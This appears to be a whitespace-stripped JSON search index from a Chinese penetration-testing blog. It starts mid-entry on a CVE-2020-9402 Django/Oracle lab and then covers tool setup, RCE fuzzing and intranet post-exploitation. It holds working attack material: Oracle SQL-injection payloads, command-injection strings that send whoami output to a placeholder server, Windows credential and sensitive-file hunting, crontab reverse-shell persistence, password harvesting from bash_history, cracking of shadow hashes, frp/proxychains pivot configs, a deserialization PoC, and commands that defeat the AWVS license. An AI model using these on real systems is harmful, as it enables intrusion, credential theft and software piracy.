0:00-fae715c332e7e+cd/usr/src+wait-for-it.sh-t0db:1521--echo'oracleisup'wait-for-it.sh:waitingfordb:1521withoutatimeoutwait-for-it.sh:db:1521isavailableafter60secondsoracleisup我们可以看到没有任何报错；继续，看下面的报错：+pythonmanage.pymakemigrationsTraceback(mostrecentcalllast):File\"/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py\",line220,inensure_connectionself.connect()File\"/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py\",line26,ininnerreturnfunc(*args,**kwargs)File\"/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py\",line197,inconnectself.connection=self.get_new_connection(conn_params)File\"/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py\",line26,ininnerreturnfunc(*args,**kwargs)File\"/usr/local/lib/python3.6/site-packages/django/db/backends/oracle/base.py\",line232,inget_new_connection**conn_params,cx_Oracle.DatabaseError:ORA-12505:TNS:listenerdoesnotcurrentlyknowofSIDgiveninconnectdescriptorTheaboveexceptionwasthedirectcauseofthefollowingexception:Traceback(mostrecentcalllast):File\"manage.py\",line21,in&lt;module&gt;main()·中间部分省略·中间部分省略·中间部分省略**conn_params,django.db.utils.DatabaseError:ORA-12505:TNS:listenerdoesnotcurrentlyknowofSIDgiveninconnectdescriptor查看报错是db的报错，赶紧看看db虚拟机的日志情况dockerlogs--since2020-09-11T14:40:00-fb32b16e34b6cdb：ls:cannotaccess/u01/app/oracle/oradata/orcl:NosuchfileordirectoryNodatabasesfoundin/u01/app/oracle/oradata/orcl.AbouttocreateanewdatabaseinstanceStartingdatabaselistenerLSNRCTLforLinux:Version12.1.0.2.0-Productionon11-SEP-202006:54:05Copyright(c)1991,2014,Oracle.Allrightsreserved.Starting/u01/app/oracle/product/12.1.0.2/dbhome_1/bin/tnslsnr:pleasewait...TNSLSNRforLinux:Version12.1.0.2.0-ProductionSystemparameterfileis/u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.oraLogmessageswrittento/u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xmlListeningon:(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=b32b16e34b6c)(PORT=1521)))Connectingto(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=b32b16e34b6c)(PORT=1521)))STATUSoftheLISTENER------------------------AliasLISTENERVersionTNSLSNRforLinux:Version12.1.0.2.0-ProductionStartDate11-SEP-202006:54:05Uptime0days0hr.0min.0secTraceLeveloffSecurityON:LocalOSAuthenticationSNMPOFFListenerParameterFile/u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.oraListenerLogFile/u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xmlListeningEndpointsSummary...(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=b32b16e34b6c)(PORT=1521)))ThelistenersupportsnoservicesThecommandcompletedsuccessfullyCopyingdatabasefiles1%complete3%complete11%complete18%complete数据库服务似乎已经启动起来了，但是数据库文件还在复制过程中：Copyingdatabasefiles，那就等待文件复制完成试试看是不是复制文件的行为。100%completeLookatthelogfile\"/u01/app/oracle/cfgtoollogs/dbca/orcl/orcl.log\"forfurtherdetails.LSNRCTLforLinux:Version12.1.0.2.0-Productionon11-SEP-202007:00:33Copyright(c)1991,2014,Oracle.Allrightsreserved.Connectingto(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=b32b16e34b6c)(PORT=1521)))ThecommandcompletedsuccessfullyDatabasehasbeencreatedin/u01/app/oracle/oradata/orclSYSandSYSTEMpasswordsaresetto[oracle]SettingHTTPportto8080PL/SQLproceduresuccessfullycompleted.Pleaselogintohttp://&lt;ip_address&gt;:8080/emtouseenterprisemanagerUser:sys;Passwordoracle;Sysdba:trueFixingpermissions...Runninginitscripts...Initscriptsin/oracle.init.d/:Ignoring/oracle.init.d/*Donewithscriptswearereadytogo难道是因为db的原因导致web服务报错，而且恰好报错是oracle数据库的错，而又恰好我们看日志时是存在这样的情况的。返回去在看web虚拟机的日志，果然：db虚拟机数据库文件拷贝完成后，这边web虚拟机重启后启动服务就没有报错了，服务跑在8000端口。+cd/usr/src+wait-for-it.sh-t0db:1521--echo'oracleisup'wait-for-it.sh:waitingfordb:1521withoutatimeoutwait-for-it.sh:db:1521isavailableafter0secondsoracleisup+pythonmanage.pymakemigrationsMigrationsfor'vuln':vuln/migrations/0001_initial.py-CreatemodelNames-CreatemodelCollection-CreatemodelCollection2+pythonmanage.pymigrateOperationstoperform:Applyallmigrations:admin,auth,contenttypes,sessions,vulnRunningmigrations:Applyingcontenttypes.0001_initial...OKApplyingauth.0001_initial...OKApplyingadmin.0001_initial...OKApplyingadmin.0002_logentry_remove_auto_add...OKApplyingadmin.0003_logentry_add_action_flag_choices...OKApplyingcontenttypes.0002_remove_content_type_name...OKApplyingauth.0002_alter_permission_name_max_length...OKApplyingauth.0003_alter_user_email_max_length...OKApplyingauth.0004_alter_user_username_opts...OKApplyingauth.0005_alter_user_last_login_null...OKApplyingauth.0006_require_contenttypes_0002...OKApplyingauth.0007_alter_validators_add_error_messages...OKApplyingauth.0008_alter_user_username_max_length...OKApplyingauth.0009_alter_user_last_name_max_length...OKApplyingauth.0010_alter_group_name_max_length...OKApplyingauth.0011_update_proxy_permissions...OKApplyingsessions.0001_initial...OKApplyingvuln.0001_initial...OK+pythonmanage.pyloaddatacollection.jsonInstalled8object(s)from1fixture(s)+pythonmanage.pyshell-c'fromdjango.contrib.auth.modelsimportUser;User.objects.create_superuser('\\''admin'\\'','\\''admin@vulhub.org'\\'','\\''admin'\\'')ifnotUser.objects.filter(username='\\''admin'\\'').exists()else0'+execpythonmanage.pyrunserver0.0.0.0:8000#令人失望的结果execpythonmanage.pyrunserver0.0.0.0:8000看到这个日志打印出来，觉得好像确实没有什么问题了，再来查看一下docker的状态。bin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcp看一眼docker的情况，都是up状态。访问一下8000端口终于也可以访问到web服务了，不再是Emptyreplyfromserver了。bin4xin@bin4xin'sMacbookProCVE-2020-9402%curllocalhost:8000&lt;!DOCTYPEhtml&gt;&lt;htmllang=\"en\"&gt;&lt;head&gt;&lt;metahttp-equiv=\"content-type\"content=\"text/html;charset=utf-8\"&gt;&lt;title&gt;Pagenotfoundat/&lt;/title&gt;&lt;metaname=\"robots\"content=\"NONE,NOARCHIVE\"&gt;&lt;styletype=\"text/css\"&gt;html*{padding:0;margin:0;}body*{padding:10px20px;}body**{padding:0;}body{font:smallsans-serif;background:#eee;color:#000;}body&gt;div{border-bottom:1pxsolid#ddd;}h1{font-weight:normal;margin-bottom:.4em;}h1span{font-size:60%;color:#666;font-weight:normal;}table{border:none;border-collapse:collapse;width:100%;}td,th{vertical-align:top;padding:2px3px;}th{width:12em;text-align:right;color:#666;padding-right:.5em;}#info{background:#f6f6f6;}#infool{margin:0.5em4em;}#infoolli{font-family:monospace;}#summary{background:#ffc;}#explanation{background:#eee;border-bottom:0pxnone;}&lt;/style&gt;web访问日志：WatchingforfilechangeswithStatReloaderNotFound:/[11/Sep/202007:01:23]\"GET/HTTP/1.1\"4042137NotFound:/[11/Sep/202007:06:47]\"GET/HTTP/1.1\"4042141---Parameter:q(GET)Type:boolean-basedblindTitle:Oracleboolean-basedblind-ParameterreplacePayload:q=(SELECT(CASEWHEN(6457=6457)THEN6457ELSECAST(1ASINT)/(SELECT0FROMDUAL)END)FROMDUAL)Type:time-basedblindTitle:Oracletime-basedblind-Parameterreplace(DBMS_PIPE.RECEIVE_MESSAGE)Payload:q=(SELECT(CASEWHEN(6135=6135)THENDBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(74)||CHR(88)||CHR(115),5)ELSE6135END)FROMDUAL)---[15:22:11][INFO]theback-endDBMSisOracleback-endDBMS:Oracle"
  },

  {
    "title"    : "「技巧」：Linux &amp; Unix Terminal小技巧",
    "category" : "",
    "tags"     : "笔记, BASH, 信息搜集",
    "url"      : "/blog/2020/vim-2-usage/",
    "date"     : "Sep 1, 2020",
    "content"  : "grepgrep-n\"get_spg2lsf\"-r./在当前文件夹下查找包含get_spg2lsf字符串的文件vim快速删除1、删除每行前10个字符：:%s/^.\\{10\\}//其中，%表示所有行，s表示替换，”%s”可用”1,$”代替（下同）；正则表达式”/^.{10}//”中，^表示行首；”.”表示要删除的字符个数，”.{10}“表示删除10个字符，可用10个”.”表示；2、删除每行后10个字符:%s/.\\{10\\}$//字符串替换vi/vim中可以使用:s命令来替换字符串。　　:s/vivian/sky/替换当前行第一个vivian为sky　　:s/vivian/sky/g替换当前行所有vivian为sky　　:n,$s/vivian/sky/替换第n行开始到最后一行中每一行的第一个vivian为sky　　:n,$s/vivian/sky/g替换第n行开始到最后一行中每一行所有vivian为skyawk在实际信息搜集过程中遇到的问题：现在有一个hosts文件，其中包含了所需要信息搜集的域名和ip地址，其格式如下存储：domain.com.cn,1.1.1.1首先按照信息搜集的方式第一步我是先过一遍ip或域名的端口，所以问题就来了；nmap不支持这种形式进行文件内容读取，需以一行一数据的形式，就是：domain.com.cn1ip1domain.com.cn2ip2不管是域名还是ip地址都是以这样的形式来读取才能使用-iL参数来读取指定的域名或ip，最后实现我们的端口扫描任务，所以是需要以逗号为界限，将两列数据分成两个文件；故我们构思一下思路：以逗号为标示，把前面一列和后面一列分别使用参数$1，$2来表示，将$1输出到domain1.txt，$2输出到domain2.txt中。"
  },

  {
    "title"    : "「安全工具」:A-Web_Vuln_Scan和aq域名爆破工具",
    "category" : "",
    "tags"     : "笔记, 安全工具, 信息搜集",
    "url"      : "/blog/2020/usetools-in-linux(aq+awvs)-server/",
    "date"     : "Jun 21, 2020",
    "content"  : "aq域名工具此处仅仅对于aq工具的报错进行部分记录，若存在无法解决的问题可以自行查询其他师傅的文章。gem换源gem安装软件之前一定要换源；gemsources--addhttps://gems.ruby-china.com/--removehttps://rubygems.org/npmconfigsetregistryhttps://registry.npm.taobao.org依赖报错geminstallaquatone&amp;&amp;npminstallelectron&amp;&amp;npminstallnightmareBuildingnativeextensions.Thiscouldtakeawhile...ERROR:Errorinstallingaquatone:ERROR:Failedtobuildgemnativeextension.currentdirectory:/var/lib/gems/2.7.0/gems/ffi-1.13.1/ext/ffi_c/usr/bin/ruby2.7-I/usr/lib/ruby/2.7.0-r./siteconf20200713-12887-ohoa28.rbextconf.rbmkmf.rbcan'tfindheaderfilesforrubyat/usr/lib/ruby/include/ruby.hYoumighthavetoinstallseparatepackagefortherubydevelopmentenvironment,ruby-devorruby-develforexample.报什么依赖的错就安装上什么依赖，上面报的错单独拿下来，看到如下得报错。Youmighthavetoinstallseparatepackagefortherubydevelopmentenvironment,ruby-devorruby-develforexample.$sudoaptinstallruby-devel把依赖安装上就可以了然后重新执行：Buildingnativeextensions.Thiscouldtakeawhile...Successfullyinstalledffi-1.13.1Successfullyinstalledchildprocess-0.7.1Successfullyinstalledmulti_xml-0.6.0WhenyouHTTParty,youmustpartyhard!Successfullyinstalledhttparty-0.14.0Successfullyinstalledaquatone-0.5.0Parsingdocumentationforffi-1.13.1Installingridocumentationforffi-1.13.1Parsingdocumentationforchildprocess-0.7.1Installingridocumentationforchildprocess-0.7.1Parsingdocumentationformulti_xml-0.6.0Installingridocumentationformulti_xml-0.6.0Parsingdocumentationforhttparty-0.14.0Installingridocumentationforhttparty-0.14.0Parsingdocumentationforaquatone-0.5.0Installingridocumentationforaquatone-0.5.0Doneinstallingdocumentationforffi,childprocess,multi_xml,httparty,aquatoneafter6seconds？+———————————————+|exportLC_ALL=C|+———————————————+npm换源同gem:-)npminstall-gelectron--registry=https://registry.npm.taobao.orgDEBUG=nightmarexvfb-runaquatone-gather-dksyun.com--threads10npminstall--savenightmare--unsafe-perm=true--allow-root--registry=https://registry.npm.taobao.orghttps://gh0st.cn/archives/2018-09-02/1问题aq-gather的执行问题，报错有关于nightmare同时这里aq存在一个问题，如果执行aq-gather报错那么就执行如下，就是下载一个shell脚本输出到bin文件夹下执行。wget\"https://gist.githubusercontent.com/random-robbie/beae1991e9ad139c6168c385d8a31f7d/raw/aq.sh\"-O/bin/aq&amp;&amp;chmod777/bin/aq然后直接aq执行就可以。aq报错:issuerunningaquatone:issuerunningaquatonegoroutine6807[running]:runtime.throw(0x14dee2a,0x21)指定参数threads和time：降低线程数和增大超时时间，这里可以自行查看一下线程数的指定参数和timeout的指定格式。awvs-linux安装awvs13还是很香的。为了保护原始license不失效，这里尽快执行如下的命令，不然license会被修改然后就无法破解成功。root@kali:~#chattr+i/home/acunetix/.acunetix_trial/data/license/license_info.jsonroot@kali:~#rm-fr/home/acunetix/.acunetix_trial/data/license/wa_data.datroot@kali:~#touch/home/acunetix/.acunetix_trial/data/license/wa_data.datroot@kali:~#chattr+i/home/acunetix/.acunetix_trial/data/license/wa_data.dat个人强烈推荐：docker版本。docker镜像下载的命令可以参考国光师傅的博客。"
  },

  {
    "title"    : "「Fuzz」:浅谈一些模糊匹配搜集信息的技巧",
    "category" : "",
    "tags"     : "笔记, fuzz, 信息搜集",
    "url"      : "/blog/2020/learn-to-fuzz/",
    "date"     : "Jun 10, 2020",
    "content"  : "写在文前：我们在web攻防期间有很多时候有一种感觉：那就是遇到rce漏洞时，bp放包的时候有一种隐隐的感觉，有的时候bp的反包字节大小莫名其妙的怪异，有经验的老师傅就索性直接跑RCE的fuzz字典，所以本篇就日常记录一些有关于web攻防期间的一些fuzz技巧服务器RCE的fuzz技巧Windows机器的fuzz即我们可以在关键参数后面使用管道符号和连接符fuzz命令执行实现我们的盲打：||和&amp;linux机器的fuzz同上||和&amp;Linux下过滤空格可以使用:${IFS},$IFS,$IFS$9JSON格式下的测试:\\u000awget\\u0020http://ipLinux下可以包括反引号，windows下不可以。Linux下正常测试rce:服务器启动web，注意需要处于监听状态下启动：bin4xin@bin4xin'sMacbookProtools%python3-mhttp.serverServingHTTPon::port8000(http://[::]:8000/)...rcefuzz命令如下：bin4xin@bin4xin'sMacbookProtools%curl192.168.101.51:8000/`whoami`同时我们反过来看web日志记录：::ffff:192.168.101.51--[19/Sep/202013:57:25]\"GET/bin4xinHTTP/1.1\"301-同理各位可以发散思维：pingwhoami.服务器地址如上，ping、curl同样适用。一些特殊字符绕过姿势:curlhttp://服务器地址/$(whoami)curlhttp://服务器地址/$(whoami|base64)'w'g'e't${IFS}服务器地址各位可以自行实验在linux下的效果。Windows探测:fuzz技巧是一样的，只是fuzz命令有一些区别；ping%USERNAME%.服务器地址------(获取计算机名)for/F%xin('whoami')dostarthttp://服务器地址/%x------(获取用户名称)for/F\"delims=\\tokens=2\"%iin('whoami')doping-n1%i.服务器地址------测试邮箱:`wget%209服务器地址/xxxx`@qq.com测试上传:`sleep10`filename测试filenname:`||wget%20服务器地址`测试上传处下的名称:;payload|payload&amp;payload;whoami|whoami&amp;whoami------个人机器信息收集浏览器[Chrome,Firefox,Edge,IE,360,QQ]信息(历史记录，密码，书签，cookie)：%LocalAppData%\\Google\\Chrome\\UserData\\Default%APPDATA%\\Mozilla\\Firefox\\Profiles\\xxxxxxxx.default\\机器内敏感文件，关键词：账号、密码、备份、登录、管理、邮箱、后台、资产、网络for/rD:\\%iin(*密码*)do@echo%ifor/rD:\\%iin(*vpn*)do@echo%ifor/rD:\\%iin(*账号*)do@echo%i机器进程杀软/edrteamviewer/等远程管理工具服务类进程：mssql/java/web服务安装软件列表当前windows凭证管理器存储的密码登录密码（mimikatz）wifi密码outlook密码……机器开放端口信息/防火墙信息/获取机器共享netstat-naopwmicsharegetname,path,status#利用wmic查找共享获取机器所有rdp连接记录获取所有盘符wmiclogicaldiskwheredrivetype=3getname,freespace,systemname,filesystem,volumeserialnumber,size#查看分区获取全盘所有敏感文件.doc\\xlsx\\md\\sql\\ppt*\\txtfor/rD:\\%iin(*.doc)do@echo%ifor/rD:\\%iin(*.xlsx)do@echo%ifor/rD:\\%iin(*.ppt*))do@echo%i本地环境hosts环境变量补丁列表当前主机的会话信息工作不饱和总结了一下个人办公机信息收集思路"
  },

  {
    "title"    : "「信息搜集」:漫谈一些在内网的信息搜集技巧",
    "category" : "",
    "tags"     : "vulnhub, 内网, 信息搜集",
    "url"      : "/blog/2020/inside-internet-walk-through/",
    "date"     : "Jun 8, 2020",
    "content"  : "经历过几次HW行动，每次HW都运气较好可以拿到服务器，于是每次公司的内网渗透的任务就交给我，记录一下对于内网的信息搜集过程，以及在此过程中我自己所积累的小技巧。2021年3月19日星期五16时37分27秒CST更新重构了部分小结的展示：重新调整了文章的阐述框架，尽可能从实战角度出发，进行章节安排；尽量使得前后小结更加紧凑，阐述逻辑更加清晰。加入了尽可能多的markdown语法，文章结构清晰的同时，让页面更加赏心悦目。写在文前：年后回来就一直在肝代码，肝的快失去信心了；正好三月中旬有场全国范围的攻防演练，就来重新拾起信心～演练结束再肝代码再失去信心，循环往复=。=本文着重从实战角度作为切入点，从获取的跳板机为入口进行阐述，基本的逻辑为：跳板机-&gt;内网代理-&gt;信息搜集-&gt;漏洞挖掘与利用我们从攻击者的角度来看，拿到一个跳板机的权限后首先是对跳板机所在的区域进行路由划分，我们可以通过这样的思路来判断获得内网中搜集到的信息是否利于我们进一步渗透，同时我们在此过程中也需要小心谨慎，攻防演练中我所遇到的基本上都是生产环境，在和开发、运维人员博弈的过程中要做到：悄悄地来、悄悄的走废话不多说，文笔较菜，文章权当抛砖引玉，回到正题。零：在机器上的信息搜集渗透的本质就是信息搜集0x01：个人工作机器信息搜集这方面我本人了解的不是很多，一般来说是通过钓鱼邮件的形式获取的WINDOWSPC权限，可以参考我另一篇从网上的搬运过来的文章：个人机器信息收集0x02：WEB服务器信息搜集一般建议可以以root用户新建用户来维持权限，或者是写入corntab计划来定时反弹shell。实操中几乎很少有运维、开发去检查定时计划的反弹shell脚本，所以基本上可以满足后持续渗透的条件。#配置文件数据库配置信息通过mybatis等配置文件就可以拿到内网中对应的数据库机器，一般都是低权限，运气好可以拿到高权限。运气再好一点存在高权限的mssql数据库可以尝试连接一下尝试xp_cmd_shell来执行命令。我们通过web层面拿到的机器，一般都是web服务器，即存在各种jar包，所以服务器里会存放大量配置文件在当前目录下搜索存在字符为'mysql'的文件grep-rn\"mysql\".=======查看对应系统的敏感配置文件catstatic/scripts/tinymce/js/tinymce/plugins/jbimages/ci/application/config/database.php=======curlifconfig.me120.25.13.49通过进程任务可以查找到部署jar包的目录和相对应依赖，大部分运维和开发都习惯于在根目录下新建data目录或者是非系统文件夹下的目录存在web的依赖jar包，我们就可以从这点做突破口。查看一下端口开放情况和对应的目录位置，有一些shell的基础就可以搜集到这些信息。ps-ef|grepjavanetstat-ANTUP有的时候拿到的机器或多或少存在一些特殊情况，比如docker机器、单纯的一个数据库机器，那么就尽力而为去做一些搜集工作，特别是docker机器，除了跑的服务，机器里面太干净了，基本没有什么可以利用的地方。#bash_history命令执行历史文件一般建议必看，里面会存着一些意想不到的内容，下面截取一小部分我在内网实战中发现的惊喜：cdnexus-3.12.0-01llcdbin/./nexusstartpactera@575cddomain/llcdnexus3/注意./nexusstart和cddomain/两条命令中间的那个“命令”，对，没错那个是sudoer用户的密码，su切换直接就拥有root权限。我们分析一下为什么出现这样的现象：个人认为是在运行nexus程序是需要密码来提升权限，然后输入者在等待过程中没有发现输入密码的shell还没有回显出来就输入了密码，从而导致密码被系统当作执行命令记录进了history文件。发现这个后，我第一时间去看了自己服务器和自己的mac本上的历史文件，搜索机器密码关键词，同时也存在这样的现象明文密码存在了里面醍醐灌顶#一些自动化搜集脚本LinEnum.shcurl-o/tmp/linenum.shhttps://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.shchmod+X/tmp/linenum.sh&amp;&amp;bash/tmp/linenum.sh#Passwd&amp;Shadow（不推荐）一般来说通过shiro和struts2拿到的shell基本都是root，很多人都会直接去读取passwd文件，其实并不可取。下面展示一下2核4G服务器跑hash文件的过程。一般是跑不出来的，哈希不可逆，除非存在彩虹表，一般都跑不出来。hashcat-m1800-a0-ofound.txtlinux-root.txt/usr/share/john/password.lst--forcehashcat(v4.0.1)starting...OpenCLPlatform#1:Thepoclproject====================================*Device#1:pthread-Intel(R)Xeon(R)Platinum8163CPU@2.50GHz,256/738MBallocatable,1MCUHashes:2digests;2uniquedigests,2uniquesaltsBitmaps:16bits,65536entries,0x0000ffffmask,262144bytes,5/13rotatesRules:1Applicableoptimizers:*Zero-Byte*Uses-64-BitPasswordlengthminimum:0Passwordlengthmaximum:256ATTENTION!Pure(unoptimized)OpenCLkernelsselected.Thisenablescrackingpasswordsandsalts&gt;length32butforthepriceofdrasticalreducedperformance.IfyouwanttoswitchtooptimizedOpenCLkernels,append-Otoyourcommandline.Watchdog:Hardwaremonitoringinterfacenotfoundonyoursystem.Watchdog:Temperatureaborttriggerdisabled.Watchdog:Temperatureretaintriggerdisabled.*Device#1:build_opts'-I/usr/share/hashcat/OpenCL-DVENDOR_ID=64-DCUDA_ARCH=0-DAMD_ROCM=0-DVECT_SIZE=8-DDEVICE_TYPE=2-DDGST_R0=0-DDGST_R1=1-DDGST_R2=2-DDGST_R3=3-DDGST_ELEM=16-DKERN_TYPE=1800-D_unroll'*Device#1:Kernelm01800.8f866878.kernelnotfoundincache!Buildingmaytakeawhile...继续:([s]tatus[p]ause[r]esume[b]ypass[c]heckpoint[q]uit=&gt;Dictionarycachebuilt:*Filename..:/usr/share/john/password.lst*Passwords.:3559*Bytes.....:26325*Keyspace..:3559*Runtime...:0secs-Device#1:autotunedkernel-accelto128-Device#1:autotunedkernel-loopsto128[s]tatus[p]ause[r]esume[b]ypass[c]heckpoint[q]uit=&gt;[s]tatus[p]ause[r]esume[b]ypass[c]heckpoApproachingfinalkeyspace-workloadadjusted.Session..........:hashcatStatus...........:ExhaustedHash.Type........:sha512crypt$6$,SHA512(Unix)Hash.Target......:linux-root.txtTime.Started.....:MonJun811:29:252020(23secs)Time.Estimated...:MonJun811:29:482020(0secs)Guess.Base.......:File(/usr/share/john/password.lst)Guess.Queue......:1/1(100.00%)Speed.Dev.#1.....:311H/s(8.82ms)Recovered........:0/2(0.00%)Digests,0/2(0.00%)SaltsProgress.........:7118/7118(100.00%)Rejected.........:0/7118(0.00%)Restore.Point....:3559/3559(100.00%)Candidates.#1....:doom2-&gt;sssHWMon.Dev.#1.....:N/AStarted:MonJun811:28:502020Stopped:MonJun811:29:4920200x03：运维机器信息搜集头脑风暴中…（没有遇到，有再更新）密码复用常见运维平台及服务的漏洞利用zabbixagent堡垒机…一：局域网里的信息搜集1x01：跳板机攻击这一小节提出的意思是：跳板机上的公网暴露和内网暴露。如：各种数据库mysql、oracle、postgresql仅内网开放区别在于：bindaddr=0.0.0.0or127.0.0.1Nmapscanreportfor(inside_ip_addr)20893/tcpopentextuiAlibabaDubboremotingtelnetd显而易见，内网里的Dubbo，反序列化走一波。1x02：内网代理内网代理，顾名思义就是我们自己可控的本机，通过各种代理方法（s5、s4），把拿下的内网服务器当作流量转发的一个中间跳板，对内网进行一系列我们想做的事情。这种情况下，我们的代理机器在内网没有具体的一个身份，只是我们通过代理的方式把我们对内网所发出的流量通过内网可控服务器向内网进行请求。极力推荐。挂了代理就已经进入了内网，十分方便。只需要配置vps（frps）端，拿下shell后下载frpc客户端，启动服务就可以。下面顺便贴上server端和client端的配置文件:frpserver:$catfrp/frps.ini[common]#vps代理TCP监听端口bind_port=7000#授权码，请改成更复杂的token={yourtoken}#frp管理后台端口，请按自己需求更改dashboard_port=7500#frp管理后台用户名和密码，请改成自己的dashboard_user={youradminusername}dashboard_pwd={youradminpassword}enable_prometheus=true#frp日志配置log_file=/var/log/frps.loglog_level=infolog_max_days=3#启动vpsfrps端$./frps-cfrps.inifrpclients（被代理客户端，可以称为跳板机）:$cats5_jsccs.ini[common]server_addr={yourvpsip}server_port=7000token={yourtoken}#此处可以自定义标签-dashboard面板proxies父栏对应的name={target}，{target}示例：s5_in_JStelecom[{target}]type=tcpremote_port=10010plugin=socks5plugin_user={yourconnectusername}plugin_passwd={yourconnectpassword}use_encryption=trueuse_compression=trueclient（代理进内网客户端，可以称为攻击机器）1.proxifier（支持mac、windows）配置自定义：server_addr={yourvpsip}server_port=7000plugin=socks5plugin_user={yourconnectusername}plugin_passwd={yourconnectpassword}2.proxychains4(linux、mac)配置/etc/proxychains.conf文件：[ProxyList]#addproxyhere...#meanwile#defaultssetto\"tor\"#socks4127.0.0.19050#socks5127.0.0.11081socks5{yourvpsip}{yourvpsport}{yourconnectusername}{yourconnectpassword}#burpsuiteproxy#http127.0.0.112344应用即可。proxychains4curlhttp://{target.ip}:{target.port}/命令进行内网访问，一般可以通过命令行进行海德拉批量口令爆破，若需GUI进行浏览器访问可使用proxifier进行全局代理进行web访问。1x03：内网穿透在写之前我们需要明确一点，就是我们所需要的内网目标是什么？而内网穿透和内网代理的分别在哪里？在什么情况我们需要做内网穿透，什么时候我们需要做内网代理？python3reGeorgSocksProxy.py-p9999-l0.0.0.0-uhttps://www.pgyer.com/tunnel.nosocket.php内网穿透就是针对一个机器下的某一个特定端口，通过流量转发的形式把端口暴露在公网上，举个例子，我们拿下了一个linux机器，很巧这个机器是运维机器，我们发现了大量的运维账号密码。又然后，发现windows的远程登录服务即3389端口，所以我们在这个时候可以使用端口服务转发的技巧，把端口流量转发到一个我们可控公网的端口上（如33890），那么我们在对我们自己可控公网的端口上进行数据请求的时候，就是在对这个windows机器的数据请求，所以我们可以很轻松的使用我们的到的账号和密码来连接对应的windows机器。所以我们做内网穿透的最终目的，很显然是：我们在已知某个内网服务器的敏感信息（如3389远程连接账号密码、3306连接账号密码），而我们在内网又无法使用windows机器远程连接、mysql-client软件对我们所得到的信息进行明确验证时，那么这个时候我们可以使用内网穿透即流量转发的手段来进行进一步验证。1x04：内网信息搜集技巧#nmap由此拿到web服务器的权限后，msf死活都连不上，就无法进行内网扫描，查资料后可以：跳板机（非root权限）本地编译安装nmap：wgethttps://nmap.org/dist/nmap-7.40.tar.bz2bzip2-cdnmap-7.40.tar.bz2|tarxvf-cdnmap-7.40./configureecho$?make&amp;&amp;makeinstallnoohup./nmap-p--T4-A192.168.0.0/24&amp;CobaltStrike插件扫描二：典型案例剖析ElasticSearchRCE敏感信息nday…Zabbix弱口令SQL注入nday…ActiveMQbasic认证弱口令ActiveMQ反序列化漏洞（CVE-2015-5254）PUT&amp;MOVE方法写入shellHystrixssrfhttp://ip:6855/proxy.stream?origin=http://www.baidu.comredis未授权写入crontab计划shiroshiro550&amp;721rememberMe反序列化struts2s2-{01-61}…其实总结下来内网里有很多可以利用的，还是要具体问题具体分析才能更好的在内网“遨游”。总结总结下来，内网的信息收集需要的是细心。参考如何在目标内网中发现更多存活主机[Arp,icmp,tcp/udp,smb,snmp…]以上。"
  },

  {
    "title"    : "javaDeser",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/javaDeser/",
    "date"     : "Jun 7, 2020",
    "content"  : "Java反序列化浅谈序列化和反序列化是一种常见的编程思想；php、python也都存在此种机制。序列化就是将对象转化成字节流，便于保存在内存、文件或者数据库中(保存此对象的状态)。反序列化就是将字节流转化为对象。我们来做个简单的小实验：定义Peopleclass-&gt;name、age，在web中很常见：importjava.io.Serializable;publicclassPeopleimplementsSerializable{publicStringname;publicintage;publicStringgetName(){returnname;}publicvoidsetName(Stringname){this.name=name;}publicintgetAge(){returnage;}publicvoidsetAge(intage){this.age=age;}}调用序列化接口把我们的Java对象转化为byte[]数组，将二进制内容写入People.txt文档：➜filePeople.txtPeople.txt:Javaserializationdata,version5➜xxdPeople.txt00000000:aced00057372000650656f706c654499....sr..PeopleD.00000010:40802db3403b0200024900036167654c@.-.@;...I..ageL00000020:00046e616d657400124c6a6176612f6c..namet..Ljava/l00000030:616e672f537472696e673b7870000000ang/String;xp...00000040:127400087869616f6d696e67.t..xiaoming➜javaTestpeople对象序列化成功！#将序列化数据写入People.txtpeople对象反序列化成功！#读取People.txt反序列化从字节流读取Java对象xiaoming18点击以快速开始/查看[序列化/反序列化]demo⌘/⏏︎+左键移步仓库查看Test.java下一步就是模拟反序列化攻击；我们添加以下攻击代码：publicclassPeopleimplementsSerializable{//添加以下方法，重写People类的readObject()方法privatevoidreadObject(java.io.ObjectInputStreamin)throwsIOException,ClassNotFoundException{//执行默认的readObject()方法in.defaultReadObject();//执行打开计算器程序命令Runtime.getRuntime().exec(\"calc.exe\");}}所以简而言之，web中传入的反序列化RCE的poc必然是传入参数可控。效果：参考Java·序列化分析调试apacheshiro反序列化漏洞(CVE-2016-4437)"
  },

  {
    "title"    : "「Docker」:use docker elegant:)",
    "category" : "",
    "tags"     : "vulnhub, 漏洞复现, 排错, 笔记",
    "url"      : "/blog/2020/howto-use-docker-elegantly/",
    "date"     : "May 27, 2020",
